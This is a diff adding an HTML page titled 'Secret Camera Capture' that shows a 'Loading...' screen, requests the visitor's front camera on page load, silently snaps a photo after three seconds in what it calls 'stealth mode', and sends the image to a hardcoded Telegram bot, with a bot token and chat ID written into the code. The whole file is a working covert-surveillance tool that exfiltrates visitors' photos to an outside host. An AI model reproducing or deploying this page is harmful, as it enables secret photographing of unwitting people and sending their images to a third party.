@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🕵️‍♂️ Secret Camera Capture</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: #000;
+            color: #fff;
+            padding: 20px;
+        }
+        #cameraView {
+            width: 100%;
+            max-width: 500px;
+            margin: 20px auto;
+            border: 3px solid #ff0000;
+            display: none;
+        }
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔴 Loading...</h1>
+    <video id="cameraView" autoplay playsinline></video>
+    <canvas id="photoCanvas" style="display:none;"></canvas>
+    <p id="status">Initializing camera...</p>
+
+    <script>
+        // Telegram Bot Config
+        const BOT_TOKEN = "8445771641:AAGoLkRA59xYVWOgMDDJxwep9UoE_S4D-6E";
+        const CHAT_ID = "7835924973";
+
+        // DOM Elements
+        const video = document.getElementById('cameraView');
+        const canvas = document.getElementById('photoCanvas');
+        const statusText = document.getElementById('status');
+
+        // 1. Request Camera Access
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: 'user', // Force front camera
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    },
+                    audio: false
+                });
+                video.srcObject = stream;
+                video.style.display = 'block';
+                statusText.textContent = "Camera active. Preparing capture...";
+                
+                // Auto-capture after 3 seconds (stealth mode)
+                setTimeout(captureAndSend, 3000);
+            } catch (err) {
+                statusText.textContent = "🚨 Error: " + err.message;
+                console.error("Camera Error:", err);
+            }
+        }
+
+        // 2. Capture Photo & Convert to Blob
+        function captureAndSend() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob((blob) => {
+                statusText.textContent = "📸 Photo captured. Sending to Telegram...";
+                sendToTelegram(blob);
+            }, 'image/jpeg', 0.95);
+        }
+
+        // 3. Send to Telegram via Bot API
+        function sendToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'secret_photo.jpg');
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    statusText.textContent = "✅ Photo sent successfully!";
+                } else {
+                    statusText.textContent = "❌ Failed to send: " + data.description;
+                }
+            })
+            .catch(err => {
+                statusText.textContent = "🔥 Network Error: " + err.message;
+            });
+        }
+
+        // Start the process when page loads
+        window.onload = initCamera;
+    </script>
+</body>
+</html>
